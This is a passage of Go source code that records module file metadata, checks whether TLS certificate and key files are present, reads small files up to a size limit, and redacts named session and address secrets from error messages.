			break
		}
		info, err := entry.Info()
		if err == nil {
			result.ModuleFiles = append(result.ModuleFiles, fileEntry{Name: entry.Name(), Mode: info.Mode().String(), Size: info.Size()})
		}
	}
	for _, path := range []string{serverPoolPath, clientCertificatePath, clientKeyPath} {
		item := tlsFile{Path: path}
		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
			item.Present, item.Mode, item.Size = true, info.Mode().String(), info.Size()
		}
		result.TLSFiles = append(result.TLSFiles, item)
	}
	return result
}

func readSmallFile(path string, maximum int64) string {
	file, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return ""
	}
	return string(value)
}

func cleanError(err error) string {
	if err == nil {
		return ""
	}
	return cleanSensitiveText(err.Error())
}

func cleanSensitiveText(value string) string {
	for _, secret := range []string{callbackSessionNonce, pinnedReadbackSession, pinnedReadbackURL, rpcDialAddress} {
		if secret != "" {
			value = strings.ReplaceAll(value, secret, "[redacted]")
		}
	}
	if len(value) > 1024 {
		value = value[:1024] + "[truncated]"
	}
	return value
}
